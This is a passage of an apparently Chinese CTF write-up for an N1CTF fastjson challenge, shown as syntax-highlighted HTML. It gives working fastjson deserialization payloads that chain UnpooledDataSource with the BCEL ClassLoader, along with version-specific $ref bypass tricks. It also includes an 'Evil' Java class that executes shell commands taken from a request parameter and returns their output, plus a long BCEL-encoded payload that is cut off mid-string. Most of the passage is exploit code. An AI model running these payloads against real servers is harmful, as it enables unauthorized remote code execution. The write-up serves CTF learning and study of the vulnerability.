class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;driver&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$$BCEL$$.....&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></code></pre></div>

<p>一般就可以了</p>
<h4 id="这题的后续操作"><a href="#这题的后续操作" class="headerlink" title="这题的后续操作"></a>这题的后续操作</h4><p>但这里报错，说明版本在1.2.25 - 1.2.32</p>
<p>然后就是上面的$ref在低版本绕过调用getter</p>
<p>把数组放在value的位置</p>
<p>记得先放入mapping</p>
<div class="code-wrapper"><pre><code class="hljs powershell">&#123;<span class="hljs-string">&quot;x&quot;</span>:[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>, <span class="hljs-string">&quot;driverClassLoader&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">$ref</span>&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span>[1]&quot;</span>&#125;, <span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>,<span class="hljs-string">&quot;&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<span class="hljs-string">&quot;connection&quot;</span>:&#123;&#125;&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">$ref</span>&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span>.connection&quot;</span>&#125;&#125;],<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>&#125;</code></pre></div>

<p>然后报错</p>
<p>SpringBoot fastJsonHttpMessageConverters进行JSON.parse的时候会默认设置期望类为路由参数里对应的类，也就是期望类为com.n1ctf.oldfastjson.User</p>
<p>导致了Root context变为了com.n1ctf.oldfastjson.User对象，因为<code>x并不是User的Field</code>，会被设置为null，导致了之前构造payload里面的各种引用都需要更改</p>
<div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> com.n1ctf.oldfastjson;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">String</span> username;    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">String</span> password;    
    <span class="hljs-keyword">private</span> Object friend;
    。。。
&#125;</code></pre></div>

<p>friend属性的类型为Object，所以用他进行反序列化</p>
<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.PrintWriter;
<span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;
<span class="hljs-keyword">import</span> java.lang.reflect.Method;
<span class="hljs-keyword">import</span> java.util.Scanner;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;

        <span class="hljs-type">Class</span> <span class="hljs-variable">requestContextHolder</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);

        <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> requestContextHolder.getDeclaredMethod(<span class="hljs-string">&quot;getRequestAttributes&quot;</span>);
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> m.invoke(<span class="hljs-literal">null</span>);

        m = obj.getClass().getMethod(<span class="hljs-string">&quot;getRequest&quot;</span>);
        <span class="hljs-type">Object</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> m.invoke(obj);

        m = obj.getClass().getMethod(<span class="hljs-string">&quot;getResponse&quot;</span>);
        <span class="hljs-type">Object</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> m.invoke(obj);

        m = request.getClass().getMethod(<span class="hljs-string">&quot;getParameter&quot;</span>, String.class);

        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> (String) m.invoke(request, <span class="hljs-string">&quot;cmd&quot;</span>);
        <span class="hljs-keyword">if</span>(cmd == <span class="hljs-literal">null</span>)&#123;
            cmd = <span class="hljs-string">&quot;id&quot;</span>;
        &#125;
        String[] cmds = &#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;
        <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next();
        
<span class="hljs-comment">//        读取f111111ag.txt的内容</span>
<span class="hljs-comment">//        InputStream inputStream = Thread.currentThread().getContextClassLoader().getResourceAsStream(&quot;f111111ag.txt&quot;);;</span>
<span class="hljs-comment">//        output = new Scanner(inputStream).useDelimiter(&quot;\\A&quot;).next();</span>

        m = response.getClass().getMethod(<span class="hljs-string">&quot;getWriter&quot;</span>);
        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> (PrintWriter) m.invoke(response);
        printWriter.println(output);
        printWriter.flush();
        printWriter.close();

    &#125;

&#125;</code></pre></div>

<div class="code-wrapper"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;a&quot;</span>:[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,],<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;asd&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;asd&quot;</span>&#125;</code></pre></div>

<div class="code-wrapper"><pre><code class="hljs powershell">&#123;
<span class="hljs-string">&quot;friend&quot;</span>:[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>, <span class="hljs-string">&quot;driverClassLoader&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">$ref</span>&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span>.friend[1]&quot;</span>&#125;, <span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$l</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$I</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$7dV</span><span class="hljs-variable">$5bW</span><span class="hljs-variable">$hU</span><span class="hljs-variable">$U</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$86</span><span class="hljs-variable">$5c</span><span class="hljs-variable">$ce0</span><span class="hljs-variable">$9d</span><span class="hljs-variable">$96</span><span class="hljs-variable">$Q</span><span class="hljs-variable">$a0eZ</span><span class="hljs-variable">$LE</span><span class="hljs-variable">$a9</span><span class="hljs-variable">$N</span><span class="hljs-variable">$F</span><span class="hljs-variable">$82</span><span class="hljs-variable">$d6kC</span><span class="hljs-variable">$c5</span><span class="hljs-variable">$om</span><span class="hljs-variable">$z</span><span class="hljs-variable">$g</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$S</span><span class="hljs-variable">$E</span><span class="hljs-variable">$91z</span><span class="hljs-variable">$99L</span><span class="hljs-variable">$O</span><span class="hljs-variable">$c9</span><span class="hljs-variable">$c0d</span><span class="hljs-variable">$86</span><span class="hljs-variable">$ce</span><span class="hljs-variable">$85</span><span class="hljs-variable">$e2</span><span class="hljs-variable">$b5</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$ea</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$9f</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$F</span><span class="hljs-variable">$3e</span><span class="hljs-variable">$f9</span><span class="hljs-variable">$92</span><span class="hljs-variable">$b6</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$ea</span><span class="hljs-variable">$ea</span><span class="hljs-variable">$83k</span><span class="hljs-variable">$e9</span><span class="hljs-variable">$f2</span><span class="hljs-variable">$c1W</span><span class="hljs-variable">$97</span><span class="hljs-variable">$P</span><span class="hljs-variable">$fa</span><span class="hljs-variable">$e2</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$Ju</span><span class="hljs-variable">$9f</span><span class="hljs-variable">$5c</span><span class="hljs-variable">$m</span><span class="hljs-variable">$90</span><span class="hljs-variable">$d4</span><span class="hljs-variable">$5cN</span><span class="hljs-variable">$ce</span><span class="hljs-variable">$f9</span><span class="hljs-variable">$f6</span><span class="hljs-variable">$3e</span><span class="hljs-variable">$7b</span><span class="hljs-variable">$ef</span><span class="hljs-variable">$f3</span><span class="hljs-variable">$ed</span><span class="hljs-variable">$7dv</span><span class="hljs-variable">$e6</span><span class="hljs-variable">$e7</span><span class="hljs-variable">$7f</span><span class="hljs-variable">$be</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$k</span><span class="hljs-variable">$c0</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$f8RA</span><span class="hljs-variable">$x</span><span class="hljs-variable">$kWp</span><span class="hljs-variable">$k</span><span class="hljs-variable">$93bxB</span><span class="hljs-variable">$c6</span><span class="hljs-variable">$93</span><span class="hljs-variable">$K</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$98</span><span class="hljs-variable">$921</span><span class="hljs-variable">$cd0</span><span class="hljs-variable">$a3</span><span class="hljs-variable">$80a</span><span class="hljs-variable">$96</span><span class="hljs-variable">$e1</span><span class="hljs-variable">$v</span><span class="hljs-variable">$Fs</span><span class="hljs-variable">$c8</span><span class="hljs-variable">$I</span><span class="hljs-variable">$cdy</span><span class="hljs-variable">$ZO</span><span class="hljs-variable">$LpA</span><span class="hljs-variable">$c6</span><span class="hljs-variable">$a2</span><span class="hljs-variable">$8cg</span><span class="hljs-variable">$Y</span><span class="hljs-variable">$96d</span><span class="hljs-variable">$9c</span><span class="hljs-variable">$90</span><span class="hljs-variable">$f1</span><span class="hljs-variable">$ac</span><span class="hljs-variable">$8ce</span><span class="hljs-variable">$Z</span><span class="hljs-variable">$X</span><span class="hljs-variable">$Y</span><span class="hljs-variable">$9eS</span><span class="hljs-variable">$f0</span><span class="hljs-variable">$3c</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$Q</span><span class="hljs-variable">$c3</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$Ktd</span><span class="hljs-variable">$Vt</span><span class="hljs-variable">$c1</span><span class="hljs-variable">$90</span><span class="hljs-variable">$91</span><span class="hljs-variable">$T</span><span class="hljs-variable">$bf</span><span class="hljs-variable">$5c</span><span class="hljs-variable">$M</span><span class="hljs-variable">$x2</span><span class="hljs-variable">$f2</span><span class="hljs-variable">$M</span><span class="hljs-variable">$F</span><span class="hljs-variable">$F</span><span class="hljs-variable">$3d0</span><span class="hljs-variable">$c5</span><span class="hljs-variable">$b0</span><span class="hljs-variable">$w</span><span class="hljs-variable">$865</span><span class="hljs-variable">$GKB</span><span class="hljs-variable">$f4</span><span class="hljs-variable">$94i</span><span class="hljs-variable">$9b</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$98</span><span class="hljs-variable">$84Pb</span><span class="hljs-variable">$60ABx</span><span class="hljs-variable">$c2</span><span class="hljs-variable">$c9q</span><span class="hljs-variable">$Jmi</span><span class="hljs-variable">$d3</span><span class="hljs-variable">$e6</span><span class="hljs-variable">$d3A1</span><span class="hljs-variable">$cb</span><span class="hljs-variable">$ddy</span><span class="hljs-variable">$3dk</span><span class="hljs-variable">$R</span><span class="hljs-variable">$SO</span><span class="hljs-variable">$3b</span><span class="hljs-variable">$86n</span><span class="hljs-variable">$z</span><span class="hljs-variable">$e8</span><span class="hljs-variable">$ae</span><span class="hljs-variable">$v</span><span class="hljs-variable">$d6U0</span><span class="hljs-variable">$ec</span><span class="hljs-variable">$XL</span><span class="hljs-variable">$8fl</span><span class="hljs-variable">$a4</span><span class="hljs-variable">$cfn</span><span class="hljs-variable">$98</span><span class="hljs-variable">$d6</span><span class="hljs-variable">$a8</span><span class="hljs-variable">$84N</span><span class="hljs-variable">$97_</span><span class="hljs-variable">$M</span><span class="hljs-variable">$b8</span><span class="hljs-variable">$e7O8</span><span class="hljs-variable">$b6</span><span class="hljs-variable">$cf7</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$f3</span><span class="hljs-variable">$8e</span><span class="hljs-variable">$95</span><span class="hljs-variable">$e3</span><span class="hljs-variable">$ae</span><span class="hljs-variable">$84</span><span class="hljs-variable">$f6</span><span class="hljs-variable">$f4</span><span class="hljs-variable">$aa</span><span class="hljs-variable">$be</span><span class="hljs-variable">$a1</span><span class="hljs-variable">$8fX</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$9d</span><span class="hljs-variable">$l</span><span class="hljs-variable">$99</span><span class="hljs-variable">$b0t</span><span class="hljs-variable">$cf</span><span class="hljs-variable">$pU</span><span class="hljs-variable">$a9</span><span class="hljs-variable">$u</span><span class="hljs-variable">$e1</span><span class="hljs-variable">$60</span><span class="hljs-variable">$j</span><span class="hljs-variable">$ee</span><span class="hljs-variable">$f2</span><span class="hljs-variable">$V</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$h</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$c8</span><span class="hljs-variable">$U</span><span class="hljs-variable">$f7</span><span class="hljs-variable">$LN</span><span class="hljs-variable">$8e</span><span class="hljs-variable">$UBNvU</span><span class="hljs-variable">$b8</span><span class="hljs-variable">$ddV</span><span class="hljs-variable">$99</span><span class="hljs-variable">$c9</span><span class="hljs-variable">$ae</span><span class="hljs-variable">$92</span><span class="hljs-variable">$G</span><span class="hljs-variable">$89X</span><span class="hljs-variable">$d5</span><span class="hljs-variable">$8d</span><span class="hljs-variable">$E</span><span class="hljs-variable">$d9</span><span class="hljs-variable">$e5</span><span class="hljs-variable">$de</span><span class="hljs-variable">$bac</span><span class="hljs-variable">$7b</span><span class="hljs-variable">$UK</span><span class="hljs-variable">$c8</span><span class="hljs-variable">$u</span><span class="hljs-variable">$e6v</span><span class="hljs-variable">$eag</span><span class="hljs-variable">$7c</span><span class="hljs-variable">$d7</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$f3</span><span class="hljs-variable">$a4</span><span class="hljs-variable">$l</span><span class="hljs-variable">$s</span><span class="hljs-variable">$R</span><span class="hljs-variable">$85</span><span class="hljs-variable">$d9</span><span class="hljs-variable">$b1</span><span class="hljs-variable">$dcL</span><span class="hljs-variable">$Yu</span><span class="hljs-variable">$C</span><span class="hljs-variable">$7f</span><span class="hljs-variable">$3d</span><span class="hljs-variable">$m</span><span class="hljs-variable">$5b</span><span class="hljs-variable">$7b</span><span class="hljs-variable">$d6</span><span class="hljs-variable">$J</span><span class="hljs-variable">$f1</span><span class="hljs-variable">$X</span><span class="hljs-variable">$5d</span><span class="hljs-variable">$d3</span><span class="hljs-variable">$X1wUtMgdv</span><span class="hljs-variable">$h</span><span class="hljs-variable">$s</span><span class="hljs-variable">$f5</span><span class="hljs-variable">$bd</span><span class="hljs-variable">$Z_7</span><span class="hljs-variable">$d6</span><span class="hljs-variable">$a6</span><span class="hljs-variable">$f4</span><span class="hljs-variable">$f52</span><span class="hljs-variable">$FD</span><span class="hljs-variable">$n</span><span class="hljs-variable">$r</span><span class="hljs-variable">$8c</span><span class="hljs-variable">$a1H</span><span class="hljs-variable">$e9</span><span class="hljs-variable">$a2</span><span class="hljs-variable">$b4HP</span><span class="hljs-variable">$cen</span><span class="hljs-variable">$g</span><span class="hljs-variable">$7c</span><span class="hljs-variable">$dd7</span><span class="hljs-variable">$v</span><span class="hljs-variable">$s</span><span class="hljs-variable">$G</span><span class="hljs-variable">$9b</span><span class="hljs-variable">$c1aXg</span><span class="hljs-variable">$b8</span><span class="hljs-variable">$c8</span><span class="hljs-variable">$40</span><span class="hljs-variable">$s</span><span class="hljs-variable">$95</span><span class="hljs-variable">$8c</span><span class="hljs-variable">$T</span><span class="hljs-variable">$b8</span><span class="hljs-variable">$G</span><span class="hljs-variable">$3fg</span><span class="hljs-variable">$K</span><span class="hljs-variable">$eaZ</span><span class="hljs-variable">$FeI</span><span class="hljs-variable">$e1C</span><span class="hljs-variable">$c5</span><span class="hljs-variable">$5d</span><span class="hljs-variable">$e8g</span><span class="hljs-variable">$f0T</span><span class="hljs-variable">$f8</span><span class="hljs-variable">$ITl</span><span class="hljs-variable">$e0</span><span class="hljs-variable">$92</span><span class="hljs-variable">$84S</span><span class="hljs-variable">$8e</span><span class="hljs-variable">$9bOz</span><span class="hljs-variable">$o</span><span class="hljs-variable">$a0</span><span class="hljs-variable">$fc</span><span class="hljs-variable">$8a</span><span class="hljs-variable">$ab</span><span class="hljs-variable">$X</span><span class="hljs-variable">$f9</span><span class="hljs-variable">$r</span><span class="hljs-variable">$c7</span><span class="hljs-variable">$5dK</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$e2</span><span class="hljs-variable">$d9</span><span class="hljs-variable">$a4Qa6Ye</span><span class="hljs-variable">$m9</span><span class="hljs-variable">$d7</span><span class="hljs-variable">$84p</span><span class="hljs-variable">$86M</span><span class="hljs-variable">$V</span><span class="hljs-variable">$_</span><span class="hljs-variable">$e1e</span><span class="hljs-variable">$caG</span><span class="hljs-variable">$9e</span><span class="hljs-variable">$fbU</span><span class="hljs-variable">$8dq</span><span class="hljs-variable">$9f</span><span class="hljs-variable">$O</span><span class="hljs-variable">$9c</span><span class="hljs-variable">$N</span><span class="hljs-variable">$7cND</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$edJ</span><span class="hljs-variable">$87</span><span class="hljs-variable">$8aW</span><span class="hljs-variable">$f0</span><span class="hljs-variable">$aa</span><span class="hljs-variable">$84</span><span class="hljs-variable">$d8n</span><span class="hljs-variable">$aa</span><span class="hljs-variable">$e9</span><span class="hljs-variable">$5c</span><span class="hljs-variable">$w</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$c3</span><span class="hljs-variable">$eb</span><span class="hljs-variable">$w</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$e3</span><span class="hljs-variable">$N</span><span class="hljs-variable">$8a</span><span class="hljs-variable">$7f</span><span class="hljs-variable">$db</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$8a7</span><span class="hljs-variable">$c5</span><span class="hljs-variable">$8e</span><span class="hljs-variable">$3de</span><span class="hljs-variable">$a4</span><span class="hljs-variable">$96</span><span class="hljs-variable">$B</span><span class="hljs-variable">$95V</span><span class="hljs-variable">$b3</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$I</span><span class="hljs-variable">$b7</span><span class="hljs-variable">$cc</span><span class="hljs-variable">$60l7</span><span class="hljs-variable">$d9</span><span class="hljs-variable">$SZLJQ</span><span class="hljs-variable">$8bW</span><span class="hljs-variable">$a0a</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$a0</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$uk</span><span class="hljs-variable">$E</span><span class="hljs-variable">$bei</span><span class="hljs-variable">$8dd</span><span class="hljs-variable">$M</span><span class="hljs-variable">$dd</span><span class="hljs-variable">$b6E</span><span class="hljs-variable">$e8o</span><span class="hljs-variable">$a9x</span><span class="hljs-variable">$hWT</span><span class="hljs-variable">$bc</span><span class="hljs-variable">$83w</span><span class="hljs-variable">$Z</span><span class="hljs-variable">$deS</span><span class="hljs-variable">$f1</span><span class="hljs-variable">$3e</span><span class="hljs-variable">$3e</span><span class="hljs-variable">$Q</span><span class="hljs-variable">$E</span><span class="hljs-variable">$7dH</span><span class="hljs-variable">$5b</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$8c</span><span class="hljs-variable">$ab</span><span class="hljs-variable">$f8</span><span class="hljs-variable">$I</span><span class="hljs-variable">$l</span><span class="hljs-variable">$ab</span><span class="hljs-variable">$f8</span><span class="hljs-variable">$E</span><span class="hljs-variable">$9f</span><span class="hljs-variable">$S</span><span class="hljs-variable">$81</span><span class="hljs-variable">$e4</span><span class="hljs-variable">$ad</span><span class="hljs-variable">$96</span><span class="hljs-variable">$ac</span><span class="hljs-variable">$8e</span><span class="hljs-variable">$s</span><span class="hljs-variable">$b9R</span><span class="hljs-variable">$f1</span><span class="hljs-variable">$Z</span><span class="hljs-variable">$3eW</span><span class="hljs-variable">$f1</span><span class="hljs-variable">$F</span><span class="hljs-variable">$faU</span><span class="hljs-variable">$5cE</span><span class="hljs-variable">$3fU</span><span class="hljs-variable">$81</span><span class="hljs-variable">$60</span><span class="hljs-variable">$5cB</span><span class="hljs-variable">$f7</span><span class="hljs-variable">$edj</span><span class="hljs-variable">$ae</span><span class="hljs-variable">$ce</span><span class="hljs-variable">$cc</span><span class="hljs-variable">$e4</span><span class="hljs-variable">$ccV</span><span class="hljs-variable">$g</span><span class="hljs-variable">$r</span><span class="hljs-variable">$i</span><span class="hljs-variable">$d9</span><span class="hljs-variable">$c5</span><span class="hljs-variable">$d6</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$e3</span><span class="hljs-variable">$9fs</span><span class="hljs-variable">$C</span><span class="hljs-variable">$3bW</span><span class="hljs-variable">$a7</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$bb</span><span class="hljs-variable">$ad2</span><span class="hljs-variable">$edd</span><span class="hljs-variable">$C</span><span class="hljs-variable">$a3P</span><span class="hljs-variable">$b1X</span><span class="hljs-variable">$a71</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$e8u</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$de</span><span class="hljs-variable">$a0</span><span class="hljs-variable">$x</span><span class="hljs-variable">$r</span><span class="hljs-variable">$c4</span><span class="hljs-variable">$f3</span><span class="hljs-variable">$baK</span><span class="hljs-variable">$87i</span><span class="hljs-variable">$eer</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$b2x</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$b7</span><span class="hljs-variable">$c6</span><span class="hljs-variable">$N</span><span class="hljs-variable">$83</span><span class="hljs-variable">$7b</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$9dJ</span><span class="hljs-variable">$j</span><span class="hljs-variable">$bb</span><span class="hljs-variable">$f3</span><span class="hljs-variable">$F</span><span class="hljs-variable">$97</span><span class="hljs-variable">$eb</span><span class="hljs-variable">$U</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$pp</span><span class="hljs-variable">$5dn</span><span class="hljs-variable">$fb</span><span class="hljs-variable">$b5ugb</span><span class="hljs-variable">$m</span><span class="hljs-variable">$bd</span><span class="hljs-variable">$5b</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$w</span><span class="hljs-variable">$b8</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$7cU</span><span class="hljs-variable">$eb</span><span class="hljs-variable">$a5</span><span class="hljs-variable">$7c</span><span class="hljs-variable">$9e</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$a3</span><span class="hljs-variable">$97o</span><span class="hljs-variable">$a9</span><span class="hljs-variable">$b6C</span><span class="hljs-variable">$bdN</span><span class="hljs-variable">$q</span><span class="hljs-variable">$f64</span><span class="hljs-variable">$VP</span><span class="hljs-variable">$S</span><span class="hljs-variable">$y</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$94</span><span class="hljs-variable">$R</span><span class="hljs-variable">$JG</span><span class="hljs-variable">$T</span><span class="hljs-variable">$8d</span><span class="hljs-variable">$d7</span><span class="hljs-variable">$ab</span><span class="hljs-variable">$c1</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d9j</span><span class="hljs-variable">$t</span><span class="hljs-variable">$ffg</span><span class="hljs-variable">$b8a</span><span class="hljs-variable">$e9</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$cf</span><span class="hljs-variable">$d5</span><span class="hljs-variable">$98</span><span class="hljs-variable">$3f</span><span class="hljs-variable">$ddd</span><span class="hljs-variable">$efr</span><span class="hljs-variable">$c3</span><span class="hljs-variable">$de</span><span class="hljs-variable">$81</span><span class="hljs-variable">$ff</span><span class="hljs-variable">$eb</span><span class="hljs-variable">$XQ</span><span class="hljs-variable">$93</span><span class="hljs-variable">$f8</span><span class="hljs-variable">$5c</span><span class="hljs-variable">$a32</span><span class="hljs-variable">$3c</span><span class="hljs-variable">$99h</span><span class="hljs-variable">$ec</span><span class="hljs-variable">$Z</span><span class="hljs-variable">$cb</span><span class="hljs-variable">$8d</span><span class="hljs-variable">$d0</span><span class="hljs-variable">$40</span><span class="hljs-variable">$b3</span><span class="hljs-variable">$ce</span><span class="hljs-variable">$o</span><span class="hljs-variable">$Ln</span><span class="hljs-variable">$w</span><span class="hljs-variable">$c7</span><span class="hljs-variable">$e9h</span><span class="hljs-variable">$a4c</span><span class="hljs-variable">$b4Ru</span><span class="hljs-variable">$b5</span><span class="hljs-variable">$a0</span><span class="hljs-variable">$db</span><span class="hljs-variable">$b7</span><span class="hljs-variable">$c5s</span><span class="hljs-variable">$81</span><span class="hljs-variable">$ed</span><span class="hljs-variable">$9bE</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$bd</span><span class="hljs-variable">$p</span><span class="hljs-variable">$b5E</span><span class="hljs-variable">$d7</span><span class="hljs-variable">$O</span><span class="hljs-variable">$TUX</span><span class="hljs-variable">$f4</span><span class="hljs-variable">$p</span><span class="hljs-variable">$be</span><span class="hljs-variable">$c9</span><span class="hljs-variable">$a9</span><span class="hljs-variable">$fc</span><span class="hljs-variable">$T</span><span class="hljs-variable">$89</span><span class="hljs-variable">$s</span><span class="hljs-variable">$N</span><span class="hljs-variable">$a9</span><span class="hljs-variable">$7e</span><span class="hljs-variable">$c7</span><span class="hljs-variable">$ac</span><span class="hljs-variable">$eb</span><span class="hljs-variable">$88</span><span class="hljs-variable">$ac</span><span class="hljs-variable">$8f</span><span class="hljs-variable">$eepU</span><span class="hljs-variable">$F</span><span class="hljs-variable">$r</span><span class="hljs-variable">$ec</span><span class="hljs-variable">$pW</span><span class="hljs-variable">$936</span><span class="hljs-variable">$b5</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$da</span><span class="hljs-variable">$c9uj</span><span class="hljs-variable">$a7</span><span class="hljs-variable">$Hj</span><span class="hljs-variable">$eeD</span><span class="hljs-variable">$Fo</span><span class="hljs-variable">$Lh</span><span class="hljs-variable">$7bw</span><span 